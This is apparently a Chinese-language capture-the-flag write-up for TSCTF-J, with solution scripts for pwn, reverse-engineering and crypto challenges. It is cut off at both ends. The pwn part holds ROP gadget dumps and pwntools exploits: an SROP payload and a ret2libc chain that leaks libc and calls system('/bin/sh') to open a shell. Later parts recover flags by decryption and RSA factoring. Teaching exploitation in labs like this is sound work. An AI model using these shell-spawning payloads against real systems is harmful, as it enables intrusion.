0x0000000000401156 : mov byte ptr [rip &#43; 0x2efb], 1 ; pop rbp ; ret
0x0000000000401220 : mov eax, 0 ; pop rbp ; ret
0x000000000040117f : mov eax, 0xf ; syscall
0x000000000040117c : mov ebp, esp ; mov rax, 0xf ; syscall
0x00000000004010e7 : mov edi, 0x404040 ; jmp rax
0x000000000040117e : mov rax, 0xf ; syscall
0x00000000004011c0 : nop ; leave ; ret
0x0000000000401187 : nop ; pop rbp ; ret
0x00000000004010ef : nop ; ret
0x000000000040116c : nop dword ptr [rax] ; endbr64 ; jmp 0x401100
0x00000000004010e6 : or dword ptr [rdi &#43; 0x404040], edi ; jmp rax
0x000000000040115d : pop rbp ; ret
0x000000000040101a : ret
0x0000000000401180 : ror byte ptr [rdi], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401011 : sal byte ptr [rdx &#43; rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401158 : sti ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040122d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040122c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401185 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404040 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
```

```python
from pwn import *

context.arch = &#39;amd64&#39;
context.log_level = &#39;info&#39;
p = remote(&#34;127.0.0.1&#34;,61027)

# 找到的 gadget 地址
syscall = 0x401185
binsh_addr = 0x402008
pop_rbp = 0x40115d
ret = 0x40101a

# 构造 SROP payload
frame = SigreturnFrame()
frame.rax = 59           # execve 系统调用号
frame.rdi = binsh_addr   # &#34;/bin/sh&#34; 字符串地址
frame.rsi = 0            # argv = NULL
frame.rdx = 0            # envp = NULL
frame.rip = syscall      # 执行 syscall

payload = b&#39;A&#39; * (48 &#43; 8)  # 填充缓冲区 &#43; rbp

# 首先设置 rax = 0xf (sigreturn 系统调用号)
# 我们需要找到一个设置 rax 的方法
# 观察发现 0x40117f : mov eax, 0xf ; syscall
mov_eax_0xf = 0x40117f

payload &#43;= p64(mov_eax_0xf)  # 设置 rax=0xf 并执行 syscall
payload &#43;= bytes(frame)       # sigreturn frame

p.sendlineafter(b&#34;It seems that something is hidden here...&#34;, payload)
p.interactive()
```

![](imgs/image-20251010105649972.png)

### 题目名称 pop（三血）

```
(base) ➜  attachment ROPgadget --binary pwn
Gadgets information
============================================================
0x0000000000400582 : adc byte ptr [rax], ah ; jmp rax
0x0000000000400581 : adc byte ptr [rax], spl ; jmp rax
0x000000000040057e : adc dword ptr [rbp - 0x41], ebx ; adc byte ptr [rax], spl ; jmp rax
0x0000000000400507 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4004d0
0x000000000040071f : add bl, dh ; ret
0x000000000040071d : add byte ptr [rax], al ; add bl, dh ; ret
0x000000000040071b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004004e7 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4004d0
0x000000000040058c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040071c : add byte ptr [rax], al ; add byte ptr [rax], al ; repz ret
0x00000000004004c3 : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004004e9 : add byte ptr [rax], al ; jmp 0x4004d0
0x000000000040058e : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040071e : add byte ptr [rax], al ; repz ret
0x0000000000400608 : add byte ptr [rbp &#43; 5], dh ; jmp 0x4005a0
0x00000000004005f8 : add byte ptr [rcx], al ; repz ret
0x0000000000400700 : add dword ptr [rax &#43; 0x39], ecx ; jmp 0x40077a
0x00000000004004f7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004005f4 : add eax, 0x200a6e ; add ebx, esi ; ret
0x0000000000400517 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004006db : add ebp, eax ; iretd
0x00000000004005f9 : add ebx, esi ; ret
0x00000000004004c6 : add esp, 8 ; ret
0x00000000004004c5 : add rsp, 8 ; ret
0x00000000004005f7 : and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004004e4 : and byte ptr [rax], al ; push 0 ; jmp 0x4004d0
0x00000000004004f4 : and byte ptr [rax], al ; push 1 ; jmp 0x4004d0
0x0000000000400504 : and byte ptr [rax], al ; push 2 ; jmp 0x4004d0
0x0000000000400514 : and byte ptr [rax], al ; push 3 ; jmp 0x4004d0
0x0000000000400502 : and cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 2 ; jmp 0x4004d0
0x0000000000400648 : call qword ptr [rax &#43; 0x4855c3c9]
0x0000000000400803 : call qword ptr [rax]
0x0000000000400625 : call qword ptr [rbp &#43; 0x48]
0x000000000040061e : call rax
0x0000000000400606 : cmp dword ptr [rdi], 0 ; jne 0x400610 ; jmp 0x4005a0
0x0000000000400605 : cmp qword ptr [rdi], 0 ; jne 0x400610 ; jmp 0x4005a0
0x00000000004006fc : fmul qword ptr [rax - 0x7d] ; ret
0x00000000004006d6 : in al, dx ; or byte ptr [rax - 0x3f], cl ; std ; add ebp, eax ; iretd
0x0000000000400619 : int1 ; push rbp ; mov rbp, rsp ; call rax
0x00000000004006dd : iretd
0x000000000040057d : je 0x400590 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x00000000004005cb : je 0x4005d8 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x0000000000400618 : je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x00000000004004eb : jmp 0x4004d0
0x000000000040060b : jmp 0x4005a0
0x0000000000400703 : jmp 0x40077a
0x000000000040086b : jmp qword ptr [rbp]
0x000000000040082b : jmp qword ptr [rsi]
0x0000000000400585 : jmp rax
0x0000000000400609 : jne 0x400610 ; jmp 0x4005a0
0x000000000040064a : leave ; ret
0x00000000004005f3 : mov byte ptr [rip &#43; 0x200a6e], 1 ; repz ret
0x00000000004006a0 : mov eax, 0 ; pop rbp ; ret
0x000000000040061c : mov ebp, esp ; call rax
0x0000000000400580 : mov edi, 0x601048 ; jmp rax
0x000000000040061b : mov rbp, rsp ; call rax
0x0000000000400649 : nop ; leave ; ret
0x0000000000400588 : nop dword ptr [rax &#43; rax] ; pop rbp ; ret
0x0000000000400718 : nop dword ptr [rax &#43; rax] ; repz ret
0x00000000004005d5 : nop dword ptr [rax] ; pop rbp ; ret
0x00000000004005f6 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; repz ret
0x00000000004006d7 : or byte ptr [rax - 0x3f], cl ; std ; add ebp, eax ; iretd
0x00000000004005cc : or ebx, dword ptr [rbp - 0x41] ; adc byte ptr [rax], spl ; jmp rax
0x00000000004005f5 : outsb dx, byte ptr [rsi] ; or ah, byte ptr [rax] ; add byte ptr [rcx], al ; repz ret
0x000000000040070c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040070e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400710 : pop r14 ; pop r15 ; ret
0x0000000000400712 : pop r15 ; ret
0x0000000000400620 : pop rbp ; jmp 0x4005a0
0x00000000004005f2 : pop rbp ; mov byte ptr [rip &#43; 0x200a6e], 1 ; repz ret
0x000000000040057f : pop rbp ; mov edi, 0x601048 ; jmp rax
0x000000000040070b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040070f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400590 : pop rbp ; ret
0x0000000000400713 : pop rdi ; ret
0x0000000000400711 : pop rsi ; pop r15 ; ret
0x000000000040070d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004e6 : push 0 ; jmp 0x4004d0
0x00000000004004f6 : push 1 ; jmp 0x4004d0
0x0000000000400506 : push 2 ; jmp 0x4004d0
0x0000000000400516 : push 3 ; jmp 0x4004d0
0x000000000040061a : push rbp ; mov rbp, rsp ; call rax
0x00000000004005fa : repz ret
0x00000000004004c9 : ret
0x00000000004005ca : sal byte ptr [rbx &#43; rcx &#43; 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x000000000040057c : sal byte ptr [rcx &#43; rdx &#43; 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x0000000000400617 : sal byte ptr [rcx &#43; rsi*8 &#43; 0x55], 0x48 ; mov ebp, esp ; call rax
0x0000000000400512 : sbb cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 3 ; jmp 0x4004d0
0x00000000004006da : std ; add ebp, eax ; iretd
0x00000000004004f2 : sub cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 1 ; jmp 0x4004d0
0x0000000000400725 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000400724 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040058a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040071a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; repz ret
0x0000000000400616 : test eax, eax ; je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x0000000000400615 : test rax, rax ; je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x00000000004004e2 : xor cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 0 ; jmp 0x4004d0
```

```python
from pwn import *

context.arch = &#39;amd64&#39;
context.log_level = &#39;info&#39;

# p = process(&#39;./pwn&#39;)
p = remote(&#34;127.0.0.1&#34;,61839)
elf = ELF(&#39;./pwn&#39;) 
libc = ELF(&#39;./libc-2.23.so&#39;)

pop_rdi = 0x0400713
ret = 0x04004c9
puts_plt = 0x04004E0
vuln_addr = 0x0400626

# 泄露 libc
offset = 16 &#43; 8
payload1 = b&#39;A&#39; * offset
payload1 &#43;= p64(pop_rdi)
payload1 &#43;= p64(elf.got[&#39;puts&#39;])
payload1 &#43;= p64(puts_plt)
payload1 &#43;= p64(vuln_addr)

p.sendlineafter(b&#34;No backdoors this time!&#34;, payload1)
p.recvline()
leak = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))

# 计算地址
libc_base = leak - libc.symbols[&#39;puts&#39;]
system = libc_base &#43; libc.symbols[&#39;system&#39;]
binsh = libc_base &#43; next(libc.search(b&#39;/bin/sh&#39;))

# 获取 shell
payload2 = b&#39;A&#39; * offset
payload2 &#43;= p64(ret)      # 栈对齐
payload2 &#43;= p64(pop_rdi)
payload2 &#43;= p64(binsh)
payload2 &#43;= p64(system)

p.sendlineafter(b&#34;No backdoors this time!&#34;, payload2)
p.interactive()
```

![](imgs/image-20251010111514969.png)

## Reverse

### 题目名称 Singin

```python
import base64

encrypted_data = bytes([
    0x23, 0x7C, 0x34, 0x61, 0x32, 0x02, 0x13, 0x3D,
    0x67, 0x12, 0x64, 0x0D, 0x37, 0x02, 0x34, 0x14,
    0x03, 0x7A, 0x2B, 0x69, 0x24, 0x70, 0x34,
    0x61, 0x32, 0x70, 0x6B, 0x76, 0x02, 0x42, 0x28
])

def create_custom_table():
    original_table = &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#43;/&#34;
    table_list = list(original_table)
    
    for i in range(64):
        j = (7 * i &#43; 5) % 64
        table_list[i], table_list[j] = table_list[j], table_list[i]
    
    return &#39;&#39;.join(table_list)

def custom_b64encode(data):
    custom_table = create_custom_table()
    standard_encoded = base64.b64encode(data).decode(&#39;ascii&#39;)
    standard_table = &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#43;/&#34;
    translation_table = str.maketrans(standard_table, custom_table)
    return standard_encoded.translate(translation_table)

# 生成key
welcome_str = b&#34;WelcomeToTSCTF&#34;
key = custom_b64encode(welcome_str).encode(&#39;ascii&#39;)

print(f&#34;Custom base64 table: {create_custom_table()}&#34;)
print(f&#34;Key: {key}&#34;)

# 解密
flag = bytearray()
for i in range(len(encrypted_data)):
    flag.append(encrypted_data[i] ^ key[i % len(key)])

print(f&#34;Flag: {flag.decode(&#39;ascii&#39;, errors=&#39;ignore&#39;)}&#34;)

# Custom base64 table: VkbKJo3PNcCSZQGXdUaLEwOet07jxAWmlsDqp9uf1Riy5F2nIB6rh4/&#43;g8TzMYHv
# Key: b&#39;w/w5t/YF0wUnwoQKwJt=&#39;
# Flag: TSCTF-J{We1c@me_t0_TS_CTF_2025}
```

### 题目名称 CryDancing

根据题面信息搜了一下，得到如下内容

![](imgs/image-20251010182840474.png)

把 ipa 文件改后缀为.zip 并解压，然后用 IDA 反编译 CryDancing

![](imgs/image-20251010183252791.png)

定位加密逻辑，提取偏移量

![](imgs/image-20251010183131906.png)

发现密钥是由一个四字节的字符串重复四次构成的，并且 MD5 值为：`674040176a34f6c994003fe85badfc48`

![](imgs/image-20251010182752401.png)

可以谷歌搜题目名字代表的这首歌，也可以直接 CMD5 反查

![](imgs/image-20251010182811426.png)

已知加密算法、密钥和 IV ，最后写个脚本解 AES 即可

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_lync_secret(encrypted_base64):
    key = b&#34;NOTDNOTDNOTDNOTD&#34;
    iv = b&#39;\x77\x01\x00\x00&#39; &#43; b&#39;\x00&#39; * 12
    encrypted_data = base64.b64decode(encrypted_base64)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    decrypted_data = unpad(decrypted_data, AES.block_size)
    return decrypted_data.decode(&#39;utf-8&#39;)

if __name__ == &#34;__main__&#34;:
    encrypted_text = &#34;bvOaEEh1F5pDkMpM6n5src&#43;Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==&#34;
    decrypted_text = decrypt_lync_secret(encrypted_text)
    print(f&#34;{decrypted_text}&#34;)
    # TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}
```

### 题目名称 听绿的秘密

附件压缩包中给了如下文件

![](imgs/image-20251010225807380.png)

hint.txt 中的内容如下：

```
java -jar Tinglv.jar Cat.png Where_is_my_cat.png
Try to find the cat!!!
```

jadx-gui 反编译 jar 文件可以得到如下代码

![](imgs/image-20251010225937698.png)

```java
package defpackage;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

/* loaded from: Tinglv.jar:Runner.class */
public class Runner {

    /* loaded from: Tinglv.jar:Runner$CustomClassLoader.class */
    static class CustomClassLoader extends ClassLoader {
        private final String resourceName;

        public CustomClassLoader(String str) {
            this.resourceName = str;
        }

        @Override // java.lang.ClassLoader
        protected Class&lt;?&gt; findClass(String str) throws ClassNotFoundException {
            try {
                InputStream resourceAsStream = getResourceAsStream(this.resourceName);
                try {
                    if (resourceAsStream == null) {
                        throw new ClassNotFoundException(&#34;Resource not found: &#34; &#43; this.resourceName);
                    }
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    byte[] bArr = new byte[1024];
                    while (true) {
                        int read = resourceAsStream.read(bArr, 0, bArr.length);
                        if (read == -1) {
                            break;
                        }
                        byteArrayOutputStream.write(bArr, 0, read);
                    }
                    byteArrayOutputStream.flush();
                    byte[] byteArray = byteArrayOutputStream.toByteArray();
                    byte[] bArr2 = new byte[byteArray.length];
                    for (int i = 0; i &lt; byteArray.length; i&#43;&#43;) {
                        bArr2[i] = (byte) (byteArray[i] - 7);
                    }
                    Class&lt;?&gt; defineClass = defineClass(str, bArr2, 0, bArr2.length);
                    if (resourceAsStream != null) {
                        resourceAsStream.close();
                    }
                    return defineClass;
                } finally {
                }
            } catch (IOException e) {
                throw new ClassNotFoundException(&#34;Can&#39;t read this: &#34; &#43; str, e);
            }
        }
    }

    public static void main(String[] strArr) {
        try {
            new CustomClassLoader(&#34;Secret.obf&#34;).loadClass(&#34;Secret&#34;).getMethod(&#34;main&#34;, String[].class).invoke(null, strArr);
        } catch (Exception e) {
            System.err.println(&#34;Error: &#34; &#43; e.getMessage());
            e.printStackTrace();
        }
    }
}
```

发现加载了Secret.obf，并且加载过程中需要把每个字节都减去 7，因此我们写个脚本解密下即可

```python
def decrypt_obf_file(encrypted_file_path, output_file_path):
    with open(encrypted_file_path, &#39;rb&#39;) as f:
        encrypted_data = f.read()
    
    # 解密数据：每个字节减7
    decrypted_data = bytearray()
    for byte in encrypted_data:
        decrypted_byte = (byte - 7) &amp; 0xFF  # 确保在0-255范围内
        decrypted_data.append(decrypted_byte)
    
    with open(output_file_path, &#39;wb&#39;) as f:
        f.write(decrypted_data)
    
    return True

def main():
    encrypted_file = &#34;Secret.obf&#34;
    output_file = &#34;secret.class&#34;
    decrypt_obf_file(encrypted_file, output_file)

if __name__ == &#34;__main__&#34;:
    main()
```

解密后得到一个 .class 文件，用在线网站反编译：https://jdec.app/

可以得到如下代码：

![](imgs/image-20251010230349674.png)

```java
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;

public class Secret {
   public static void main(String[] var0) throws Exception {
      if (var0.length &lt; 2) {
         System.out.println(&#34;2 args required.&#34;);
      } else {
         Path var1 = Paths.get(var0[0]);
         Path var2 = Paths.get(var0[1]);
         byte[] var3 = Files.readAllBytes(var1);
         byte[] var4 = Arrays.copyOf(var3, var3.length);
         int var5 = 123;

         for(int var6 = 0; var6 &lt; var4.length; &#43;&#43;var6) {
            int var7 = var4[var6] &amp; 255;
            int var8 = (var6 &#43; var5) % 8;
            int var9 = var7 &#43; var6 % 251 &#43; var5 &amp; 255;
            int var10;
            if (var8 == 0) {
               var10 = var9;
            } else {
               var10 = (var9 &lt;&lt; var8 | var9 &gt;&gt;&gt; 8 - var8) &amp; 255;
            }

            var4[var6] = (byte)var10;
            var5 = var5 &#43; var10 &#43; 37 &amp; 255;
         }

         Files.write(var2, var4, new OpenOption[0]);
         System.out.println(&#34;Done.&#34;);
      }
   }
}
```

因此我们对照着加密逻辑写个脚本还原图片即可

```python
import sys
import os

def decrypt_image(encrypted_file_path, output_file_path):
    with open(encrypted_file_path, &#39;rb&#39;) as f:
        encrypted_data = bytearray(f.read())
    
    # 解密数据
    decrypted_data = bytearray(len(encrypted_data))
    key = 123  # 初始密钥，与Java代码一致
    
    for i in range(len(encrypted_data)):
        encrypted_byte = encrypted_data[i] &amp; 0xFF
        shift = (i &#43; key) % 8
        # 反向旋转操作（循环右移）
        if shift == 0:
            rotated = encrypted_byte
        else:
            # 循环右移：与Java中的左移相反
            rotated = ((encrypted_byte &gt;&gt; shift) | (encrypted_byte &lt;&lt; (8 - shift))) &amp; 0xFF
        # 反向加法运算
        original_byte = (rotated - (i % 251) - key) &amp; 0xFF
        decrypted_data[i] = original_byte
        # 更新密钥（必须与加密时使用相同的加密字节）
        key = (key &#43; encrypted_byte &#43; 37) &amp; 0xFF
    
    # 保存解密后的文件
    with open(output_file_path, &#39;wb&#39;) as f:
        f.write(decrypted_data)
        
    return True

def main():
    encrypted_file = &#34;Where_is_my_cat.png&#34;
    output_file = &#34;flag.png&#34;
    decrypt_image(encrypted_file, output_file)

if __name__ == &#34;__main__&#34;:
    main()
```

![](imgs/image-20251010230637919.png)



## Crypto

### 题目名称 Sign in

```python
import base64

KEY1 = bytes.fromhex(&#39;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93&#39;)
KEY2_XOR_KEY1 = bytes.fromhex(&#39;b38dc315bb7c75e3c9fa84f123898ff684fd36189e83c422cf0d2804c12b4c83&#39;)
KEY2_XOR_KEY3 = bytes.fromhex(&#39;11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f&#39;)
FLAG_XOR_ALL = bytes.fromhex(&#39;e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121&#39;)


KEY2 = bytes(a ^ b for a, b in zip(KEY2_XOR_KEY1, KEY1))
KEY3 = bytes(a ^ b for a, b in zip(KEY2_XOR_KEY3, KEY2))
FLAG_XORED = bytes(a ^ b ^ c ^ d for a, b, c, d in zip(FLAG_XOR_ALL, KEY1, KEY2, KEY3))

flag_hex = FLAG_XORED.hex()
flag_bytes = bytes.fromhex(flag_hex)
flag = base64.b64decode(flag_bytes).decode()
print(f&#34;{flag}&#34;)
# TSCTF-J{I_like_Crypto}
```

### 题目名称 Cantor&#39;s gifts

```python
from math import factorial

# 给定的扰乱后的信息
hint = 2498752981111460725490082182453813672840574
hint2 = b&#39;5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t&#39;

# 还原过程：通过 hint 逆推排列
def recover_permutation(hint, n):
    permutation = []
    remaining_elements = list(range(1, n &#43; 1))  # 1 to n
    for i in range(n):
        factorial_part = factorial(n - i - 1)
        index = hint // factorial_part
        permutation.append(remaining_elements.pop(index))
        hint %= factorial_part
    return permutation

# 将扰乱后的字符串和恢复的排列结合，恢复原始消息
def recover_message(permutation, hint2):
    original_message = [None] * len(hint2)
    for i, pos in enumerate(permutation):
        original_message[pos - 1] = hint2[i:i&#43;1]  # 恢复原始位置
    return b&#39;&#39;.join(original_message)

# 恢复排列
n = len(hint2)
recovered_permutation = recover_permutation(hint, n)

# 恢复原始消息
original_message = recover_message(recovered_permutation, hint2)
flag = b&#39;TSCTF-J{&#39; &#43; original_message &#43; b&#39;}&#39;
print(flag)
# b&#39;TSCTF-J{c4nt0r5_g1ft_f0r_th3_f1r5t_y0u_t0_m3t}&#39;
```

### 题目名称 p=~q

```python
from math import isqrt
from Crypto.Util.number import long_to_bytes

n = 17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543
c = 6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460
e = 0x10001

# 尝试 k = 1024
k = 1024
p_plus_q = 3 * (2**(k-1))

# 计算 p - q
D = p_plus_q**2 - 4*n
sqrt_D = isqrt(D)
if sqrt_D * sqrt_D == D:
    p = (p_plus_q &#43; sqrt_D) // 2
    q = (p_plus_q - sqrt_D) // 2
    if p * q == n:
        print(&#34;p =&#34;, p)
        print(&#34;q =&#34;, q)
    else:
        print(&#34;Not this k&#34;)
else:
    print(&#34;k =&#34;, k, &#34;failed, try k = 1023&#34;)

phi = (p-1)*(q-1)
d = pow(e, -1, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag)
# b&#39;TSCTF-J{The_easiest_RSA_key!}&#39;
```

### 题目名称 野狐禅

```python
from Crypto.Util.number import long_to_bytes
import sympy

def parse_challenge_file(filename=&#34;challenge.txt&#34;):
    with open(filename, &#39;r&#39;) as f:
        lines = f.readlines()

    data = {}
    data[&#39;n&#39;] = int(lines[0].split(&#39;: &#39;)[1])
    data[&#39;g&#39;] = int(lines[1].split(&#39;: &#39;)[1])
    data[&#39;k&#39;] = int(lines[2].split(&#39;: &#39;)[1])
    data[&#39;eqs&#39;] = int(lines[3].split(&#39;: &#39;)[1])

    num_ciphertexts = 2 * data[&#39;k&#39;]
    ciphertexts = [int(line.strip()) for line in lines[4 : 4 &#43; num_ciphertexts]]
    
    lcg_raws = [int(line.strip()) for line in lines[4 &#43; num_ciphertexts : 4 &#43; 2 * num_ciphertexts]]

    return data, ciphertexts, lcg_raws

def decrypt_y_sequence(data, ciphertexts, lcg_raws):
    n = data[&#39;n&#39;]
    n2 = n * n
    k = data[&#39;k&#39;] 
    y = []

    for i in range(2 * k):
        c = ciphertexts[i]
        raw = lcg_raws[i]
        r = raw % n
        
        # 计算 r^n mod n^2 的逆元
        try:
            # r=0的情况
            if r == 0:
                y.append(0)
                continue
            r_n = pow(r, n, n2)
            r_n_inv = pow(r_n, -1, n2)
        except ValueError:
            print(f&#34;Error: r={r} is not invertible modulo n2. This should not happen.&#34;)
            return None

        # c&#39; = c * (r^n)^-1 mod n^2
        c_prime = (c * r_n_inv) % n2
        
        # m = (c&#39; - 1) / n
        m = (c_prime - 1) // n
        y.append(m)

    print(&#34;[&#43;] Successfully decrypted the full y sequence.&#34;)
    return y

def solve_linear_system(k, y):
    print(&#34;[*] Building the linear system Ax = b...&#34;)
    
    # A * coeffs = b
    # b 是 y 序列的后半部分
    b = y[k:]
    
    # A 是一个 k x k 的矩阵
    A_list = []
    for i in range(k):
        # 构造矩阵的每一行
        # y[k&#43;i] = sum(coeffs[j] * y[k&#43;i-1-j])
        # A_row = [y[k&#43;i-1], y[k&#43;i-2], ..., y[i]]
        row = y[k &#43; i - 1 : i - 1 if i &gt; 0 else None : -1]
        A_list.append(row)
    
    print(&#34;[*] Solving for coefficients using SymPy for an exact solution...&#34;)
    try:
        # 使用SymPy进行精确的有理数运算求解
        A_sym = sympy.Matrix(A_list)
        b_sym = sympy.Matrix(b)
        
        # 求解 Ax = b
        coeffs_sym = A_sym.LUsolve(b_sym)
        
        # 将解转换为整数列表
        coeffs = [int(c) for c in coeffs_sym]
        
        print(&#34;[&#43;] Coefficients found:&#34;, coeffs)
        return coeffs
    except sympy.matrices.common.NonInvertibleMatrixError:
        print(&#34;Error: The matrix A is singular (as determined by SymPy). Cannot find a unique solution.&#34;)
        return None
    except Exception as e:
        print(f&#34;An unexpected error occurred while solving with SymPy: {e}&#34;)
        return None

def reconstruct_flag(coeffs):
    flag_int = 0
    for i in range(len(coeffs)):
        flag_int &#43;= coeffs[i] * (3**i)
    
    flag = long_to_bytes(flag_int)
    return flag.decode()

def main():
    data, ciphertexts, lcg_raws = parse_challenge_file()
    y = decrypt_y_sequence(data, ciphertexts, lcg_raws)
    coeffs = solve_linear_system(data[&#39;k&#39;], y)
    flag = reconstruct_flag(coeffs)
    print(f&#34;flag: {flag}&#34;)

if __name__ == &#34;__main__&#34;:
    main()
    
# [&#43;] Successfully decrypted the full y sequence.
# [*] Building the linear system Ax = b...
# [*] Solving for coefficients using SymPy for an exact solution...
# [&#43;] Coefficients found: [2, 1, 2, 1, 1, 0, 0, 0, 2, 1, 1, 2, 1, 0, 2, 0, 2, 0, 2, 0, 2, 2, 2, 2, 1, 1, 2, 1, 0, 2, 1, 1, 0, 2, 0, 0, 2, 0, 1, 1, 2, 1, 2, 1, 1, 2, 0, 2, 1, 0, 0, 1, 1, 0, 0, 2, 1, 2, 1, 0, 1, 1, 1, 0, 1, 0, 2, 1, 2, 0, 1, 0, 2, 0, 2]
# flag: We_sh0u1d_kn0w!
```

### 题目名称  Microsoft&#39;s gifts

题目附件给的源代码如下：

```python
import random
from typing import Tuple, Optional
from Crypto.Util.number import inverse

class EllipticCurve:
    def __init__(self, a: int, b: int, p: int, g: Tuple[int, int], name: str = &#34;secp256r1&#34;):
        self.a = a
        self.b = b
        self.p = p
        self.g = g
        self.name = name
    
    def is_on_curve(self, point: Optional[Tuple[int, int]]) -&gt; bool:
        if point is None:
            return True
        
        x, y = point
        return (y * y - x * x * x - self.a * x - self.b) % self.p == 0
    
    def add(self, p1: Optional[Tuple[int, int]], p2: Optional[Tuple[int, int]]) -&gt; Optional[Tuple[int, int]]:
        if p1 is None:
            return p2
        if p2 is None:
            return p1
        
        x1, y1 = p1
        x2, y2 = p2
        
        if x1 == x2 and y1 != y2:
            return None
        
        if x1 == x2:
            m = (3 * x1 * x1 &#43; self.a) * inverse(2 * y1, self.p)
        else:
            m = (y1 - y2) * inverse(x1 - x2, self.p)
        
        m %= self.p
        x3 = (m * m - x1 - x2) % self.p
        y3 = (y1 &#43; m * (x3 - x1)) % self.p
        y3 = (-y3) % self.p
        
        return (x3, y3)
    
    def multiply(self, k: int, point: Optional[Tuple[int, int]]) -&gt; Optional[Tuple[int, int]]:
        if point is None:
            return None
        
        if k &lt; 0:
            return self.multiply(-k, self.negate(point))
        
        result = None
        addend = point
        
        while k:
            if k &amp; 1:
                result = self.add(result, addend)
            addend = self.add(addend, addend)
            k &gt;&gt;= 1
        
        return result
    
    def negate(self, point: Optional[Tuple[int, int]]) -&gt; Optional[Tuple[int, int]]:
        if point is None:
            return None
        
        x, y = point
        return (x, (-y) % self.p)


if __name__ == &#34;__main__&#34;:
    from ecdsa.secp256r1 import p, a, b, g, n
    assert g == (0xAB810FFEEDCDDDDDDDDDDDDDDDDDD14072846639338962BA3CCD672905844000, 0xEEF7CDA2DC7B65D4FC3EF49B2893974BF97FD4F1082CB4791362CAC30E8841C)
    E = EllipticCurve(a, b, p, g)
    public_key = E.multiply(random.randint(2, n - 1), g)

    print(&#34;Connecting...&#34;)
    print(f&#34;Connected to TSCTF-J, the public key is {hex(public_key[0]), hex(public_key[1])}&#34;)

    print(&#34;=&#34; * 60)
    print(&#34;Welcome to TSCTF-J! We should check if you are real administrator:&#34;)
    print(&#34;=&#34; * 60)

    print(&#34;Tell me your curve now: [p, a, b]&#34;)
    user_curve = input()
    try:
        p_in, a_in, b_in = eval(user_curve)
    except Exception:
